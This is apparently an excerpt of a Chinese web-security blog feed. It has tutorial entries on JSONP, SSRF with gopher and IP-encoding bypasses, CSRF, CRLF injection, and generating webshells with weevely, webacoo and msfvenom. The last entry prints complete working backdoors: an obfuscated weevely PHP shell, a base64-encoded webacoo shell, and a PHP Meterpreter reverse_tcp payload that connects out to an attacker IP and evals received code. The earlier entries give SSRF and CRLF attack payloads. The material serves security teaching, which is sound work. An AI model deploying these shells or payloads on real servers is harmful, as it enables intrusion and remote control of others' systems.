可选，指定可以得到的额外字段</p><p>如果origin的源不在许可范围内，服务器返回的响应就不包含以上字段，说明请求出错，但状态码仍有可能是200</p><ol start="2"><li><strong>漏洞</strong></li></ol><p>如果服务器Access-Control-Allow-Origin配置不当可以被绕过，就可能造成漏洞，可以修改请求中的origin字段进行检测<br>存在兼容问题——仅支持 IE10 以上</p><h2 id="03-JSONP"><a href="#03-JSONP" class="headerlink" title="03 JSONP"></a>03 JSONP</h2><ol><li><p><strong>定义</strong></p><p>JSON（JavaScript Object Notation），是一种数据交换格式</p><p>JSONP（JSON with Padding）是用于传递JSON的一种方式，可用于解决主流浏览器的跨域数据访问的问题</p><p>另一种解释：JSONP 是一种非正式传输协议，该协议的一个要点就是允许用户传递一个 callback 参数给服务端，然后服务端返回数据时会将这个 callback 参数作为函数名来包裹住 JSON 数据，这样客户端就可以随意定制自己的函数来自动处理返回数据了</p><p>因需使用 URL 引入资源，JSONP只支持GET，CORS支持所有请求方式</p></li><li><p><strong>实现过程</strong></p><p>假如在remote.com存在一个json数据</p><pre><code class="hljs json">&#123;<span class="hljs-attr">"id"</span>:<span class="hljs-string">"1"</span>,<span class="hljs-attr">"name"</span>:<span class="hljs-string">"test"</span>&#125;</code></pre><p>服务端json.php代码<br>接收一个函数名，用这个函数返回json值</p><pre><code class="hljs php+HTML">&lt;?phpheader(&#39;Content-type: application&#x2F;json&#39;);$callback&#x3D;$_GET[&#39;callback&#39;];print $callback.&#39;(&#123;&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;test&quot;&#125;);&#39;;?&gt;</code></pre><p>客户端请求代码<br>定义一个获取json的函数，并将函数名作为参数发送到客户端</p><pre><code class="hljs php+HTML">&lt;script&gt;  function mygetjson(json)&#123;    alert(json.name)  &#125;&lt;&#x2F;script&gt;&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;remote.com&#x2F;json.php?callback&#x3D;mygetjson&quot;&gt;&lt;&#x2F;script&gt;</code></pre><p>打开客户端页面后，可以看到弹出了test即json中name的值</p></li><li><p><strong>漏洞</strong></p><ul><li>由于script是跨域的，使攻击者得到了敏感的json值<br>防御方法：验证referer、添加token</li><li>由于callback参数可以自定义，攻击者可以插入xss代码<br>防御方法：严格定义 Content-Type: application / json<pre><code>过滤 callback 以及 JSON 数据输出</code></pre></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF漏洞简介</title>
    <link href="/SSRF%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/"/>
    <url>/SSRF%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<p>SSRF和gopher协议的简单整理</p><a id="more"></a><h1 id="SSRF漏洞简介"><a href="#SSRF漏洞简介" class="headerlink" title="SSRF漏洞简介"></a>SSRF漏洞简介</h1><h2 id="01-原理"><a href="#01-原理" class="headerlink" title="01 原理"></a>01 原理</h2><ol><li><p><strong>简介</strong></p><p>SSRF，服务端请求伪造，是一种构造请求，由服务端发起请求的安全漏洞</p><p>客户端利用SSRF发送请求到服务端，服务端与内网通讯，将内网资源发给客户端</p><p>对比：CSRF发生在客户端，SSRF发生在服务器</p></li><li><p><strong>原理</strong><br>服务端提供了从其他服务器获取数据的功能，没有对内网目标地址做过滤与限制</p><p>相关函数：</p><ul><li>file_get_contents<br>用于获得文件内容</li><li>fsockopen<br>用于获取URL的数据，会使用socket建立tcp服务器来传输原始数据</li><li>curl_exec<br>使用curl发送请求获取数据</li></ul></li><li><p><strong>常见地点</strong></p><ul><li>WEB功能：<br>对外发起网络请求的地方都可能存在SSRF漏洞，如图片下载，转码，分享页面，在线翻译，文章图片收藏，未公开的API等，如果提交不同的URL回显不同，就可能存在SSRF漏洞</li><li>URL关键字：<br>url、link、src、source、target、share、sourceURL、imageURL、domain等</li></ul></li></ol><h2 id="02-应用"><a href="#02-应用" class="headerlink" title="02 应用"></a>02 应用</h2><ol><li><p><strong>危害</strong></p><ul><li><p>读取文件<br>?url=<a href="http://www.baidu.com/robots.txt" target="_blank" rel="noopener">http://www.baidu.com/robots.txt</a></p></li><li><p>端口扫描（可以扫描内网，因为服务器就在内网）<br>?url:=dict://127.0.0.1:1234/</p><p>访问未开放端口，脚本会显示空白或者报错<br>当访问开放端口，会显示banner信息</p></li><li><p>判断主机是否存活</p></li><li><p>读取系统本地文件<br>?url:=file://路径/file</p></li><li><p>内网web应用指纹识别<br>大多数web应用框架都有一些独特的文件和目录 ，可以通过这些文件识别出应用的类型甚至详细版本，如判断cms<br>?url:=<a href="http://localhost/phpmyadmin/README" target="_blank" rel="noopener">http://localhost/phpmyadmin/README</a></p></li><li><p>攻击内网应用<br>可以实现对内网的访问，从而可以攻击内网应用或本地机器获得shell</p></li><li><p>DOS攻击<br>请求内网的大文件</p></li><li><p>万金油协议gopher<br>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）</p></li></ul></li><li><p><strong>简单举例</strong></p><p>代码如下</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$url = $_GET[<span class="hljs-string">'url'</span>];$curlobj = curl_init($url);curl_exec($curlobj);<span class="hljs-meta">?&gt;</span></code></pre><p>扫描3306端口，发现返回了mysql的版本信息</p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><p><img src="2.png" srcset="/img/loading.gif" alt=""></p></li><li><p><strong>防御方法</strong></p></li></ol><ul><li>限制协议<br>   仅允许http和https请求</li><li>限制IP<br>   发送的请求的IP不能是内网IP<br> 几个内网IP的正则表达式<ul><li>^10(.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$</li><li>^172.([1][6-9]|[2]\d|3[01])(.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</li><li>^192.168(.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</li></ul></li><li>限制端口<br>   限制请求的端口为http常用的端口</li><li>过滤返回信息<ul><li>统一错误信息</li></ul></li></ul><ol start="4"><li><p><strong>绕过方法</strong></p><ul><li><p><a href="http://www.A.com@1.2.3.4" target="_blank" rel="noopener">www.A.com@1.2.3.4</a> 真正访问的地址是@后的IP地址</p></li><li><p>xip.io<br>xip.io这个网站的子域名会解析到对应的IP，例如192.168.0.1.xip.io，解析到192.168.0.1</p></li><li><p>IP地址转化为进制</p><p>对于内网IP的过滤可以采用改编IP的写法的方式进行绕过<br>例如192.168.0.1这个IP地址可以被改写成：</p><ul><li>8进制格式：0300.0250.0.1</li><li>16进制格式：0xC0.0xA8.0.1</li><li>10进制整数格式：3232235521</li><li>16进制整数格式：0xC0A80001</li><li>合并后两位：1.1.278 / 1.1.755</li><li>合并后三位：1.278 / 1.755 / 3.14159267</li></ul><p>IP中的每一位，各个进制可以混用</p><p>Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作</p></li><li><p>使用短地址</p></li><li><p>使用IDN<br>IDN是域名国际化，是指部分或完全使用特殊的文字或字母组成的互联网域名</p></li></ul></li></ol><h2 id="03-gopher"><a href="#03-gopher" class="headerlink" title="03 gopher"></a>03 gopher</h2><ol><li><p><strong>简介</strong></p><p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）</p><p>可以使用curl进行发送gopher</p></li><li><p><strong>格式</strong><br>gopher://127.0.0.1:70/_ + TCP/IP数据<br>默认端口为70，TCP/IP数据需要URL编码</p></li><li><p><strong>一个生成gopher的payload的脚本</strong></p><pre><code class="hljs python"><span class="hljs-comment">#coding: utf-8</span><span class="hljs-comment">#author: JoyChou</span><span class="hljs-keyword">import</span> sysexp = <span class="hljs-string">''</span><span class="hljs-keyword">with</span> open(sys.argv[<span class="hljs-number">1</span>]) <span class="hljs-keyword">as</span> f:    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> <span class="hljs-string">'&gt;&lt;+'</span>:            <span class="hljs-keyword">continue</span>        <span class="hljs-comment"># 判断倒数第2、3字符串是否为\r</span>        <span class="hljs-keyword">elif</span> line[<span class="hljs-number">-3</span>:<span class="hljs-number">-1</span>] == <span class="hljs-string">r'\r'</span>:            <span class="hljs-comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span>            <span class="hljs-keyword">if</span> len(line) == <span class="hljs-number">3</span>:                exp = exp + <span class="hljs-string">'%0a%0d%0a'</span>            <span class="hljs-keyword">else</span>:                line = line.replace(<span class="hljs-string">r'\r'</span>, <span class="hljs-string">'%0d%0a'</span>)                <span class="hljs-comment"># 去掉最后的换行符</span>                line = line.replace(<span class="hljs-string">'\n'</span>, <span class="hljs-string">''</span>)                exp = exp + line        <span class="hljs-comment"># 判断是否是空行，空行替换为%0a</span>        <span class="hljs-keyword">elif</span> line == <span class="hljs-string">'\x0a'</span>:            exp = exp + <span class="hljs-string">'%0a'</span>        <span class="hljs-keyword">else</span>:            line = line.replace(<span class="hljs-string">'\n'</span>, <span class="hljs-string">''</span>)            exp = exp + line<span class="hljs-keyword">print</span> exp</code></pre><p>抓包后进行编码即可</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>SSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSRF漏洞简介</title>
    <link href="/CSRF%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/"/>
    <url>/CSRF%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<p>CSRF原理的简单整理</p><a id="more"></a><h1 id="CSRF漏洞简介"><a href="#CSRF漏洞简介" class="headerlink" title="CSRF漏洞简介"></a>CSRF漏洞简介</h1><h2 id="01-原理"><a href="#01-原理" class="headerlink" title="01 原理"></a>01 原理</h2><ol><li><p><strong>定义</strong><br>CSRF（跨站请求伪造）使已经登陆浏览器的用户执行非本意的操作，如诱使受害者点击发送请求的链接，由于浏览器通常会保存用户的信息，请求就会在用户未知的情况下被执行</p></li><li><p><strong>关键点</strong><br>浏览器会记录用户会话的cookie，IP地址等，继承受害者的身份和特权，攻击者只能冒充受害者的身份发送请求，而不能直接获取身份信息<br>如果用户当前对该站点已经进行了身份认证，该站点就无法区分受害者发送的合法请求和攻击者伪造的请求</p></li><li><p><strong>必要条件</strong></p><ol><li>用户已经登陆了系统，并且浏览器自动记录了用户的凭证</li><li>用户点击了伪造的URL</li></ol></li></ol><h2 id="02-应用"><a href="#02-应用" class="headerlink" title="02 应用"></a>02 应用</h2><ol><li><p><strong>目标</strong></p><p>CSRF攻击的目标是能够改变服务器状态或数据的业务或功能，如更改受害者的电子邮件地址、密码、购买商品等</p><p>对攻击者来说，CSRF无法获得服务器的响应，因此，CSRF针对引起状态变化的请求</p><p>可以与XSS相结合，形成存储型的CSRF，攻击性会被放大</p></li><li><p><strong>实际场景</strong></p><p>例如在转账的场景中：<br>正常链接：<a href="http://www.xxx.com/pay.php?target=xx&amp;money=100">www.xxx.com/pay.php?target=xx&amp;money=100</a><br>用户正常转账操作需要目标与金额两个参数，攻击者可以根据这两个参数伪造链接，并通过社工等一些方法诱使受害者点击伪造的链接<br>恶意链接：<a href="http://www.com/pay.php?target=hacker&amp;money=100000">www.com/pay.php?target=hacker&amp;money=100000</a><br>用户就将在不知情的情况下将钱转给攻击者</p></li><li><p><strong>攻击方式</strong></p><ol><li><p>GET型<br>可以与XSS结合，加载网页后就自动发送了GET请求<br>&lt;img src=<a href="http://www.xxx.com/pay.php?target=xx&amp;money=100\&gt;">www.xxx.com/pay.php?target=xx&amp;money=100\&gt;</a></p></li><li><p>POST型<br>在网页中构造一个表单，打开网页后就自动向目标提交了表单</p><pre><code class="hljs php+HTML">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;www.xxx.com&quot; method&#x3D;POST&gt;    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;target&quot; value&#x3D;&quot;hacker&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;money&quot; value&#x3D;&quot;100&quot; &#x2F;&gt;&lt;&#x2F;form&gt;</code></pre></li><li><p>链接型<br>以广告等形式诱使受害者点开链接</p></li></ol></li></ol><h2 id="03-防御"><a href="#03-防御" class="headerlink" title="03 防御"></a>03 防御</h2><h3 id="无效的防御措施"><a href="#无效的防御措施" class="headerlink" title="无效的防御措施"></a>无效的防御措施</h3><ol><li>使用秘密cookie<br>所有的cookie，包括秘密cookie也会随着每个请求提交，无法防御</li><li>仅接受POST请求<br>尽管攻击者无法构造GET型的恶意链接，但仍可以在网页中构造POST的表单，通过JavaScript进行发送</li><li>多步交易<br>只要攻击者掌握了每一步，就可以实现CSRF攻击</li></ol><h3 id="有效防御措施"><a href="#有效防御措施" class="headerlink" title="有效防御措施"></a>有效防御措施</h3><p>有效的防御可以从两个方面来入手：</p><ul><li>阻止外域的访问</li><li>添加本域才能获得的验证信息</li></ul><ol><li><p>同源检测<br>可以通过HTTP请求头中的origin和referer字段来确定来源，如果来源不可信，就直接阻止请求</p><ul><li><p>origin<br>如果origin存在，直接就可以确定来源，但是在IE11的同源策略和302重定向中不存在origin字段</p></li><li><p>referer<br>对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。对于页面跳转，Referer为打开页面历史记录的前一个页面地址</p><p>但是验证referer完全依赖与浏览器，而浏览器自身可能有漏洞，同时攻击者可以隐藏或者修改referer<br>从HTTPS页面跳转到HTTP页面时，referer也会丢失</p></li></ul><p>同源检测并非万无一失，攻击者仍有修改的可能<br>CSRF大多来自第三方域名，但攻击者也有在本域发起攻击的可能</p></li><li><p>CSRF Token</p><p>设置一个token来区分正常请求和非法请求</p><p>Token要放在Session而不能再放在cookie中，服务器对客户端提交的Token进行解密，检查是否一致和是否过期</p><p>一个生成Token的例子</p><pre><code class="hljs php+HTML">&lt;?phpfunction generateToken()&#123;$salt&#x3D;&quot;test&quot;.date(&quot;Y:M:D&quot;);&#x2F;&#x2F;随机字符串与当前时间拼接  $token&#x3D;md5($salt);&#x2F;&#x2F;加密  return $token;&#125;$token&#x3D;generateToken();session_start();$_SESSION[&quot;user_token&quot;]&#x3D;$token;?&gt;&lt;html&gt;  &lt;head&gt;    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;    &lt;title&gt;CSRF_TOKEN&lt;&#x2F;title&gt;  &lt;&#x2F;head&gt;  &lt;body&gt;    &lt;h1&gt;      CSRF_TOKEN    &lt;&#x2F;h1&gt;    &lt;form action&#x3D;&quot;check.php&quot; method&#x3D;&quot;post&quot;&gt;      &lt;input type&#x3D;&quot;text&quot; value&#x3D;&quot;我提交了&quot;&gt;      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;user_token&quot; value&#x3D;&quot;&lt;?php echo $token; ?&gt;&quot;&gt;      &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;    &lt;&#x2F;form&gt;  &lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>检查Token是否一致</p><pre><code class="hljs php+HTML">&lt;?php  session_start();  $token1&#x3D;$_POST[&quot;user_token&quot;];  $token2&#x3D;$_SESSION[&quot;user_token&quot;];  echo $token1;  echo PHP_EOL;  echo $token2;  echo PHP_EOL;if($token1&#x3D;&#x3D;$token2)&#123;echo &quot;success!&quot;;  &#125;else&#123;    echo &quot;fail&quot;;  &#125;?&gt;</code></pre></li><li><p>双重cookie</p><p>利用了CSRF无法获取cookie的特点</p><p>用户访问网页时获得一个cookie，向后端发送请求时将cookie添加到url中，后端验证cookie与URL中的参数是否一致</p><p>但如果存在XSS使得cookie泄露，就无法实现防护</p></li><li><p>Samesite cookie属性</p><ul><li>Samesite=Strict<br>严格模式，Cookie 在任何情况下都不可能作为第三方 Cookie</li><li>Samesite=Lax<br>宽松模式，如果请求改变了当前页面或者打开了新页面，且同时是个GET请求，则这个Cookie可以作为第三方Cookie</li></ul><p>严格模式安全性很高，但用户每次都要重新登陆，体验较差<br>宽松模式时通过页面跳转过来的时候可以使用Cookie，可以保障外域连接打开页面时用户的登录状态，安全性较低</p><p>Samesite cookie对浏览器兼容还不够好，且不支持子域，每个子域名用户都需要重新登陆</p></li><li><p>二次验证<br>对于敏感操作需要用户重新输入密码和验证码</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>CSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CRLF注入漏洞</title>
    <link href="/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <url>/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>CRLF注入漏洞简介</p><a id="more"></a><h1 id="CRLF注入漏洞"><a href="#CRLF注入漏洞" class="headerlink" title="CRLF注入漏洞"></a>CRLF注入漏洞</h1><h2 id="01-原理"><a href="#01-原理" class="headerlink" title="01 原理"></a>01 原理</h2><p>CRLF是”回车 + 换行”（\r\n）的简称，回车符（CR，ASCII 13，\r，%0d），换行符(LF，ASCII 10，\n，%0a)</p><p>回车使光标移动到行首，源自于打字机的概念<br>换行使光标垂直移动到下一行</p><p>在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来</p><p>所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS</p><h2 id="02-危害"><a href="#02-危害" class="headerlink" title="02 危害"></a>02 危害</h2><ol><li>修改cookie</li><li>反射型XSS</li><li>跳转劫持</li><li>钓鱼</li></ol><h2 id="03-利用"><a href="#03-利用" class="headerlink" title="03 利用"></a>03 利用</h2><h3 id="固定会话漏洞"><a href="#固定会话漏洞" class="headerlink" title="固定会话漏洞"></a>固定会话漏洞</h3><p>假设一个网页具有跳转功能，代码如下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  $url=$_GET[<span class="hljs-string">'url'</span>];header(<span class="hljs-string">"Location:$url"</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>可以在URL中传参进行跳转 ?url=<a href="http://www.baidu.com" target="_blank" rel="noopener">http://www.baidu.com</a></p><p>正常的响应包如下:</p><pre><code class="hljs groovy">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">302</span> Moved Temporarily <span class="hljs-string">Date:</span> xxxContent-<span class="hljs-string">Type:</span> text/html Content-<span class="hljs-string">Length:</span> <span class="hljs-number">154</span> <span class="hljs-string">Connection:</span> close <span class="hljs-string">Location:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//www.baidu.com</span></code></pre><p>如果在传参时使用CRLF注入指定cookie<br>?url=<a href="http://www.baidu.com%0d%0aSet-cookie:JSPSESSID%3Dcrlftest">http://www.baidu.com%0d%0aSet-cookie:JSPSESSID%3Dcrlftest</a></p><p>检测到%0d%0a后，就认为Location首部字段这行结束了，Set-Cookie就会被认为是下一行</p><p>响应如下：</p><pre><code class="hljs groovy">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">302</span> Moved Temporarily <span class="hljs-string">Date:</span> xxxContent-<span class="hljs-string">Type:</span> text/html Content-<span class="hljs-string">Length:</span> <span class="hljs-number">154</span> <span class="hljs-string">Connection:</span> close <span class="hljs-string">Location:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//www.baidu.com</span>Set-<span class="hljs-string">cookie:</span> JSPSESSID=crlftest</code></pre><p>此时我们成功设置了一个Session，造成了固定会话漏洞</p><h3 id="绕过XSSFilter"><a href="#绕过XSSFilter" class="headerlink" title="绕过XSSFilter"></a>绕过XSSFilter</h3><p>利用CRLF还可以绕过浏览器的保护，造成XSS</p><p>原因是当HTTP头中含有X-XSS-Protection并且值为0时，浏览器不会开启Filter，我们可以利用CRLF注入为HTTP头添加这一字段</p><p>?url=%0aX-XSS-Protection:%200%0d%0a%0d%0a&lt;img%20src=1%20onerror=alert(1)&gt;</p><p>此时就成功注入了</p><pre><code class="hljs angelscript">X-XSS-Protection：<span class="hljs-number">0</span></code></pre><p>关闭了浏览器的Filter</p><p>同时注入</p><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(1)&gt;</code></pre><p>实现了XSS</p><h2 id="04-修复"><a href="#04-修复" class="headerlink" title="04 修复"></a>04 修复</h2><p>对用户输入的数据的合法性进行校验，限制用户输入CR和LF，或者在数据返回到响应头之前删除所有的换行符</p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>XSS</tag>
      
      <tag>CRLF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>生成webshell的三个工具</title>
    <link href="/%E7%94%9F%E6%88%90webshell%E7%9A%84%E4%B8%89%E4%B8%AA%E5%B7%A5%E5%85%B7/"/>
    <url>/%E7%94%9F%E6%88%90webshell%E7%9A%84%E4%B8%89%E4%B8%AA%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<p>weevely、webacoo、PHP Meterpreter使用方法简介</p><a id="more"></a><h1 id="生成webshell的三个工具"><a href="#生成webshell的三个工具" class="headerlink" title="生成webshell的三个工具"></a>生成webshell的三个工具</h1><h2 id="01-weevely"><a href="#01-weevely" class="headerlink" title="01 weevely"></a>01 weevely</h2><p>在kali中输入weevely，可以显示出帮助banner</p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><p>连接：weevely &lt;url&gt; &lt;password&gt; [cmd]</p><p>恢复Session：weevely session &lt;path&gt; [cmd]</p><p>生成webshell：weevely generate &lt;password&gt; &lt;path&gt;</p><p><img src="2.png" srcset="/img/loading.gif" alt=""><br>如图，生成一个密码为pass的webshell test.php ,内容如下</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$S=<span class="hljs-string">'$k="1c~a1dc91c~c"c~;$kh="90732c~5c6927c~1";$kf=c~"ddf0cc~9c~4c~4bc72";$p="c~xhgv4un6Yc~'</span>;$C=<span class="hljs-string">'kc~&#123;$j&#125;;&#125;c~&#125;return $o;&#125;c~if(@pc~c~reg_match("/$kc~h(.+)$kc~f/",@fc~ic~lc~e_getc~_con'</span>;$B=<span class="hljs-string">'c~();$r=c~@basc~ec~64_encode(@x(@gzc~coc~mpress($o),$k)c~);prc~int("$p$kh$r$c~kf");&#125;'</span>;$b=<span class="hljs-string">'tents("php://c~c~input"),$m)=c~c~=1)&#123;c~@ob_start();@c~evc~c~al(@gzuncompc~ress(@x(c~'</span>;$A=str_replace(<span class="hljs-string">'g'</span>,<span class="hljs-string">''</span>,<span class="hljs-string">'cgreatgge_gfggunction'</span>);$M=<span class="hljs-string">'@basc~e64_decc~c~ode($m[1])c~,$k)));$o=@c~oc~b_get_c~contentsc~c~();@obc~c~_end_clean'</span>;$g=<span class="hljs-string">'orc~($ic~=0;$i&lt;$l;)&#123;c~for($j=c~0;(c~$j&lt;$cc~&amp;c~&amp;$i&lt;$c~l);$j++,$c~i++)&#123;$o.=$t&#123;$ic~&#125;^c~$'</span>;$L=<span class="hljs-string">'6f4lCS8"c~;funcc~tc~ion x(c~$t,$c~k)&#123;$c=strc~lc~en($k)c~;$l=strlen($t);$c~o="";c~f'</span>;$l=str_replace(<span class="hljs-string">'c~'</span>,<span class="hljs-string">''</span>,$S.$L.$g.$C.$b.$M.$B);$f=$A(<span class="hljs-string">''</span>,$l);$f();<span class="hljs-meta">?&gt;</span></code></pre><p>将test.php放到web服务器的根目录下，使用weevely进行连接<br><img src="3.png" srcset="/img/loading.gif" alt=""></p><p>如图，获得了shell可以执行指令</p><p>在shell中输入help可以获得功能模块列表<br><img src="4.png" srcset="/img/loading.gif" alt=""></p><p>以system_info为例，可以看到返回了系统信息<br><img src="5.png" srcset="/img/loading.gif" alt=""></p><h2 id="02-webacoo"><a href="#02-webacoo" class="headerlink" title="02 webacoo"></a>02 webacoo</h2><p>webacoo的通信内容使用cookie头传输，且内容经过base64加密</p><p>在kali中输入webacoo -h即可查看帮助信息<br><img src="6.png" srcset="/img/loading.gif" alt=""></p><p>生成：webacoo -g -o test.php</p><p>连接：webacoo -t -u  url</p><p>生成一个newtest.php<br><img src="7.png" srcset="/img/loading.gif" alt=""></p><p>内容如下</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> $b=strrev(<span class="hljs-string">"edoced_4"</span>.<span class="hljs-string">"6esab"</span>);<span class="hljs-keyword">eval</span>($b(str_replace(<span class="hljs-string">" "</span>,<span class="hljs-string">""</span>,<span class="hljs-string">"a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t J 1 0 p K X t v Y l 9 z d G F y d C g p O 3 N 5 c 3 R l b S h i Y X N l N j R f Z G V j b 2 R l K C R f Q 0 9 P S 0 l F W y d j b S d d K S 4 n I D I + J j E n K T t z Z X R j b 2 9 r a W U o J F 9 D T 0 9 L S U V b J 2 N u J 1 0 s J F 9 D T 0 9 L S U V b J 2 N w J 1 0 u Y m F z Z T Y 0 X 2 V u Y 2 9 k Z S h v Y l 9 n Z X R f Y 2 9 u d G V u d H M o K S k u J F 9 D T 0 9 L S U V b J 2 N w J 1 0 p O 2 9 i X 2 V u Z F 9 j b G V h b i g p O 3 0 = "</span>))); <span class="hljs-meta">?&gt;</span></code></pre><p>将其放到web服务器根目录中，进行连接</p><p><img src="8.png" srcset="/img/loading.gif" alt=""></p><p>输入load即可查看功能模块</p><p><img src="9.png" srcset="/img/loading.gif" alt=""></p><p>使用下载模块下载index.html</p><p><img src="10.png" srcset="/img/loading.gif" alt=""></p><p>下载成功</p><h2 id="03-PHP-Meterpreter"><a href="#03-PHP-Meterpreter" class="headerlink" title="03 PHP Meterpreter"></a>03 PHP Meterpreter</h2><p>metasplot的msfvenom工具可以用来制作PHPmeterpreter</p><p>输入msfvenom可以查看帮助</p><p><img src="11.png" srcset="/img/loading.gif" alt=""></p><p>选择payload为php/mterpreter/reverse_tcp，目标IP为192.168.0.105，输出格式为raw，生成的文件为meter.php</p><p><img src="12.png" srcset="/img/loading.gif" alt=""></p><p>内容如下，使用时要将第一行&lt;?php 前的注释删除</p><pre><code class="hljs php"><span class="hljs-comment">/*&lt;?php /**/</span> error_reporting(<span class="hljs-number">0</span>); $ip = <span class="hljs-string">'192.168.0.105'</span>; $port = <span class="hljs-number">4444</span>; <span class="hljs-keyword">if</span> (($f = <span class="hljs-string">'stream_socket_client'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f(<span class="hljs-string">"tcp://&#123;$ip&#125;:&#123;$port&#125;"</span>); $s_type = <span class="hljs-string">'stream'</span>; &#125; <span class="hljs-keyword">if</span> (!$s &amp;&amp; ($f = <span class="hljs-string">'fsockopen'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = <span class="hljs-string">'stream'</span>; &#125; <span class="hljs-keyword">if</span> (!$s &amp;&amp; ($f = <span class="hljs-string">'socket_create'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); <span class="hljs-keyword">if</span> (!$res) &#123; <span class="hljs-keyword">die</span>(); &#125; $s_type = <span class="hljs-string">'socket'</span>; &#125; <span class="hljs-keyword">if</span> (!$s_type) &#123; <span class="hljs-keyword">die</span>(<span class="hljs-string">'no socket funcs'</span>); &#125; <span class="hljs-keyword">if</span> (!$s) &#123; <span class="hljs-keyword">die</span>(<span class="hljs-string">'no socket'</span>); &#125; <span class="hljs-keyword">switch</span> ($s_type) &#123; <span class="hljs-keyword">case</span> <span class="hljs-string">'stream'</span>: $len = fread($s, <span class="hljs-number">4</span>); <span class="hljs-keyword">break</span>; <span class="hljs-keyword">case</span> <span class="hljs-string">'socket'</span>: $len = socket_read($s, <span class="hljs-number">4</span>); <span class="hljs-keyword">break</span>; &#125; <span class="hljs-keyword">if</span> (!$len) &#123; <span class="hljs-keyword">die</span>(); &#125; $a = unpack(<span class="hljs-string">"Nlen"</span>, $len); $len = $a[<span class="hljs-string">'len'</span>]; $b = <span class="hljs-string">''</span>; <span class="hljs-keyword">while</span> (strlen($b) &lt; $len) &#123; <span class="hljs-keyword">switch</span> ($s_type) &#123; <span class="hljs-keyword">case</span> <span class="hljs-string">'stream'</span>: $b .= fread($s, $len-strlen($b)); <span class="hljs-keyword">break</span>; <span class="hljs-keyword">case</span> <span class="hljs-string">'socket'</span>: $b .= socket_read($s, $len-strlen($b)); <span class="hljs-keyword">break</span>; &#125; &#125; $GLOBALS[<span class="hljs-string">'msgsock'</span>] = $s; $GLOBALS[<span class="hljs-string">'msgsock_type'</span>] = $s_type; <span class="hljs-keyword">if</span> (extension_loaded(<span class="hljs-string">'suhosin'</span>) &amp;&amp; ini_get(<span class="hljs-string">'suhosin.executor.disable_eval'</span>)) &#123; $suhosin_bypass=create_function(<span class="hljs-string">''</span>, $b); $suhosin_bypass(); &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">eval</span>($b); &#125; <span class="hljs-keyword">die</span>();</code></pre><p>将webshell传到web服务器后，在攻击机启动msfconsole进行监听</p><p><img src="13.png" 